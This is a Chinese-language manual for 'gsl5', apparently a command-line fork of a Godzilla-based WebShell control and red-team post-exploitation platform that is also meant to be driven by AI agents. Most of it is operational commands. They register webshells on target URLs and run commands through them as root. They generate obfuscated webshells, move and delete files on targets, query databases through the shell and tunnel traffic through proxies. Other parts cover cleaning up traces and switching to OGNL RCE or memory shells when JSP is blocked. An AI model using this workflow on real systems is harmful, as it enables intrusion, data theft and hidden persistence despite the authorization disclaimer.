# GSL5 CLI 使用文档

> **面向人类操作者的 gsl5 命令行手册。** AI agent 请读 [cli/SKILL.md](cli/SKILL.md)（同源精简版）；
> 设计决策与实施方案见 [docs/CLI化改造实施方案.md](docs/CLI化改造实施方案.md)；
> 开发准则见 [AGENTS.md](AGENTS.md)。原上游文档 [README.md](README.md) 未改动。
>
> ⚠️ 仅供**授权**安全测试与研究使用，详见文末[合规声明](#合规声明)。

---

## 1. 这是什么

本仓库是 GSL5（Godzilla 深度二开的 WebShell 管理与红队后渗透平台）的 **CLI 化 fork**：在保留上游 GUI 与 MCP 服务的前提下，新增一条命令行能力面 `gsl5`，作为 agent 自动化与人工调试的**单一能力源**。

- **一套能力，三种用法**：L2 语义子命令（42 个高频命令，flag 糖衣）、L1 `call` 透传（60 个工具 100% 可达，含全部插件工具）、`tools` 目录（实时自省工具面）。
- **task 隔离**：一个任务 = 一个 `--task` 名 = 一个独立 `data.db`；`--task` 可选，缺省 `default`。
- **原生生词**：CLI 命令名 = 上游 MCP 工具名，参数名一致，零翻译层——上游升级 CLI 自动跟上。

## 2. 构建与安装

### 2.1 前置

| 项 | 要求 |
|---|---|
| JDK | **8**（构建与运行统一；禁止 JDK 11+ 编译） |
| Maven | 3.6+（唯一构建路径） |
| 第三方依赖 | `com.gsl5.thirdparty:origin-libs:3.1.8`——从上游 Release jar（本地 `origin-jar/gsl5.jar`，不入库）一次性提取安装，方法见 `pom.xml` 头部注释 |

### 2.2 构建

```bash
# ~/.m2 不可写时（沙箱环境）：export GSL5_MVN_ARGS="-Dmaven.repo.local=$PWD/.build-tmp/m2repo"
cli/build-cli.sh
# 产物：target/gsl5.jar（uber-jar，含全部依赖）→ 同步为 cli/gsl5.jar，并自动冒烟 cli version
```

构建细节：源码树为 UTF-8 主 + 8 个 GBK 文件的混合体，Maven 默认遍按 UTF-8 编译并排除 GBK 清单，第二遍（`process-classes` 阶段）按 GBK 只编译该清单；shade 收敛依赖并写入 `Main-Class: core.Gsl5Main`。详见 [AGENTS.md](AGENTS.md) §1/§3。

### 2.3 运行入口

```bash
cli/gsl5 <命令>          # 推荐：wrapper 负责 task 目录（chdir）与隔离守卫
java -jar cli/gsl5.jar cli <命令>   # 直连方式（当前目录即 task 目录，无隔离守卫）
```

## 3. 快速开始

```bash
$ cli/gsl5 --task demo shell_list
{"ok":true,"task":"demo","tool":"shell_list","text":"id | url | proxyType+remark\n"}

$ cli/gsl5 --task demo shell_add --url http://192.168.1.10:8080/shell.jsp \
    --password pass --secretKey key --payload JavaDynamicPayload --cryption JAVA_AES_BASE64
{"ok":true,"task":"demo","tool":"shell_add","text":"添加成功! Shell ID: c8c19490-..."}

$ cli/gsl5 --task demo shell_exec --shellId c8c19490-... --command 'id && hostname'
{"ok":true,"task":"demo","tool":"shell_exec","text":"uid=0(root) ..."}
```

## 4. task 概念（隔离模型）

```
<tasks-root>/                      # 默认 ./tasks，可用 --tasks-root / $GSL5_TASKS_ROOT 改
├── shared/profile/                # 全局模板资产（各 task 符号链接共享，非 DB）
├── default/                       # 默认 task：--task 省略时落这里，首用即建
│   ├── data.db                    # 本 task 唯一 DB（shell/分组/设置）
│   ├── GodzillaCache/<shellId>/   # 会话缓存（按 shellId 天然隔离）
│   ├── logs/operation_audit.db    # 操作审计（随 task 生命周期）
│   └── profile -> ../shared/profile
└── <task>/                        # 显式命名任务：结构同上
```

- 解析优先级：`--task` > 环境变量 `GSL5_TASK` > `default`。
- **约定**：临时/人工调试可用 `default`；正式任务与多 agent 协作**必须显式命名**。同一任务的多操作者共享同一 task（复用 shell 列表），跨任务天然隔离。
- wrapper 守卫：`data.db` 为符号链接即拒绝（防隐性共享）；网络文件系统（NFS/CIFS/SMB）拒绝（WAL 不安全）；task 名含 `..`/`/`/`\` 即拒绝（防路径逃逸，退出码 2）。
- 跨 task 迁移只走 `shell_export` / `shell_import`（`gsl5://` 链接，24 项配置全打包）。

## 5. 命令参考

### 5.1 全局选项

```text
[--task NAME]         task 名，缺省 "default"
[--tasks-root DIR]    task 根目录，缺省 $GSL5_TASKS_ROOT，再缺省 ./tasks
[--format json|text]  输出格式，默认 json
[--timeout SECONDS]   单命令超时，默认 120（长任务放宽，如 --timeout 600）
[--no-color]          text 模式禁用着色
```

### 5.2 输出契约与退出码

- **stdout 恰好一行 JSON**：成功 `{"ok":true,"task":...,"tool":...,"text"/业务字段...}`；失败 `{"ok":false,"task":...,"error":...,"hint"?,"exitCode":N}`。日志全部走 stderr（`[gsl5]` 前缀）。
- 工具返回的 JSON 业务字段会合入信封，但保留键 `ok`/`task`/`tool` 不被覆盖（契约字段恒由 CLI 自身填写）。
- 元命令（`help`/`tools`/`task`）的人类形态为多行纯文本，**不是** JSON；机读请用 `gsl5 tools --json` / `gsl5 task --json`。
- `--format text` 时成功输出原文（供人工阅读）。
- **退出码**：`0` 成功 / `2` 用法错误（未知命令、缺必填 flag、JSON 解析失败）/ `3` 目标连接或执行失败 / `4` 超时 / `5` task 写锁竞争超限。

### 5.3 L2 子命令（42 个；完整参数见 `gsl5 help` 或 `gsl5 tools <name>`）

**Shell 面（18）**

| 命令 | 必填 flag | 说明 |
|---|---|---|
| `shell_list` | — | 列出 Shell（`--group` 过滤） |
| `shell_search` / `shell_count` | keyword / — | 搜索 / 统计 |
| `shell_get` / `shell_info` / `shell_test` | `--shellId` | 读配置 / 系统信息 / 连接测试 |
| `shell_detect_encoding` | `--shellId` | 编码探测写回（乱码时用） |
| `shell_add` | url password secretKey payload cryption | 注册 Shell（支持 `--proxyType/--proxyHost/--proxyPort`、`--encoding`、超时等） |
| `shell_edit` | `--shellId` | 编辑（改完自动清会话缓存） |
| `shell_delete` / `shell_clone` | `--shellId` | 删除 / 克隆 |
| `shell_batch_test` | — | 批量连接测试（`--group`） |
| `shell_exec` | shellId command | 执行命令（`--encoding auto` 自动探测） |
| `shell_env` | `--shellId` | 环境变量 get/set/del/list |
| `shell_export` / `shell_import` | — / `--link` | `gsl5://` 链接导出/导入 |
| `shell_create` | cryption genFile | 生成 WebShell 文件（`--obfuscation` 六种混淆、C2 自动模板） |
| `shell_backup` | — | 备份 Shell 列表 |

**文件面（12）**

| 命令 | 必填 flag | 说明 |
|---|---|---|
| `file_list` / `file_roots` | `--shellId` | 目录浏览 / 根目录 |
| `file_read` | shellId path | 读小文件（大文件用下行） |
| `file_download_local` | shellId remotePath **localPath**（别名 `--out`） | 大文件直存本地 |
| `file_upload_local` | shellId **localPath**（别名 `--file`） remotePath | 本地文件直传（自动分片） |
| `file_delete` / `file_mkdir` | shellId path | 删除 / 新建目录 |
| `file_copy` / `file_move` | shellId src dest | 复制 / 移动 |
| `file_search` | shellId pattern | 文件搜索 |
| `file_attr` | shellId path | 属性/时间设置 |
| `file_remote_down` | shellId url savePath | 目标侧远程下载 |

**数据库面（4）**

| 命令 | 必填 flag | 说明 |
|---|---|---|
| `db_connect` | `--shellId` | 经壳连库：`--target 'host port user pass type'` 或分字段；`--configName` 保存 |
| `db_exec` | shellId sql | 执行 SQL（`--execType select/update`） |
| `db_tables` | shellId database | 列表 |
| `db_list_types` | `--shellId` | 当前 Payload 支持的库类型 |

**其他（8）**：`process_list`、`net_info`、`payload_list`、`c2profile_list`、`c2profile_get`、`settings_get`、`settings_set`、`oplog_query`（均以 `--shellId`/对应参数调用）。

### 5.4 元命令

```bash
gsl5 call <tool-name> --json '{"shellId":"3",...}'  # L1 透传：任意 tools/list 工具（含插件工具）
gsl5 tools [关键词]                                  # 工具目录（60 个：50 内置 + ~10 插件）
gsl5 tools <tool-name>                               # 单工具参数 schema（必填标注）
gsl5 tools --json                                    # 机读目录
gsl5 task list | task path                           # task 管理
gsl5 version                                         # {"ok":true,"version":"3.1.8",...}
gsl5 doctor                                          # 自检：JDK/DB/文件系统/审计/工具覆盖率
gsl5 --help                                          # 帮助
```

> 上游新增/改名工具**无需升级 CLI**：`call` 透传自动可达，`tools` 目录自动跟上（schema 即文档，零漂移）。

## 6. 代理（出口隧道）

代理是 **Shell 的持久属性**，在 HTTP 通道层对全部工具流量统一生效：

```bash
gsl5 --task T shell_add --url ... --proxyType SOCKS --proxyHost 127.0.0.1 --proxyPort 1080
gsl5 --task T shell_edit --shellId ID --proxyType HTTP --proxyHost 127.0.0.1 --proxyPort 8080  # 改后立即生效
```

- 类型词汇：`NO_PROXY`（默认直连）/ `HTTP` / `SOCKS` / `GLOBAL_PROXY`（走 `settings` 里的全局代理配置）。
- `shell_import` 的 `gsl5://` 链接携带代理配置，跨 task 迁移不丢。
- **环境变量 `http_proxy`/JVM 系统属性代理不受支持**，唯一可靠路径是 per-shell 配置。

## 7. 纪律

1. **大文件**：`file_download_local --out` / `file_upload_local --file` 直存直传（服务端分片，不经上下文）；`--json` 内嵌 base64 仅限小内容。
2. **乱码**：目标回显乱码用 `--encoding auto`（自动探测并写回 DB），或 `shell_detect_encoding`。
3. **审计**：每条命令自动落账 `<task>/logs/operation_audit.db`——多操作者协作的回溯依据，禁止绕过。
4. **写锁**：快速写命令（shell_add/edit/delete/clone/import、settings_set）串行化（10s 等待），竞争超限退出码 5；长操作不加锁。
5. **清理**：任务结束后删除目标上的落壳文件（**注意同步删除 Tomcat `work/` 编译缓存**，否则已加载类继续服务）与本地 task 目录。

## 8. 测试

```bash
cli/tests/compat-golden.sh        # 契约回归：信封/task 矩阵/退出码/tools/doctor/审计（12 项）
```

实验室端到端用例（Tomcat CVE-2017-12615 → MySQL 横向 → frp 隧道 + S2-048）见 [AGENTS.md](AGENTS.md) §4.1——仅限授权环境执行。

## 9. 常见问题

- **构建报 `Read-only file system`（~/.m2）**：沙箱环境用 `export GSL5_MVN_ARGS="-Dmaven.repo.local=$PWD/.build-tmp/m2repo"`。
- **命令报 `HeadlessException`**：通常是目标连接失败被上游错误路径掩盖（已知问题 K1，改进 backlog）——先 `shell_test`/`doctor` 排查连通性。
- **目标所有 `*.jsp` 返回 403**：环境加固（安全约束/过滤器），JSP 落壳路线不可用；此时 RCE 本身（如 s2-048 OGNL）即命令执行级 shell，持久化需内存壳方案。
- **GUI 用户**：上游功能不受影响——`java -jar gsl5.jar`（GUI）、`mcp` 子命令（MCP 服务）行为与上游一致；本 fork 新增的仅有 `cli` 子命令与 Db 两行 PRAGMA。

## 合规声明

本工具基于 Godzilla 深度二次开发，**仅供授权安全测试与研究使用**，严禁用于任何非法用途；使用产生的后果由使用者自行承担（详见 [README.md](README.md) 免责声明）。AGENTS.md §4.1 实验室用例仅限授权拓扑执行，环境不可达时如实记录，禁止伪造结果。
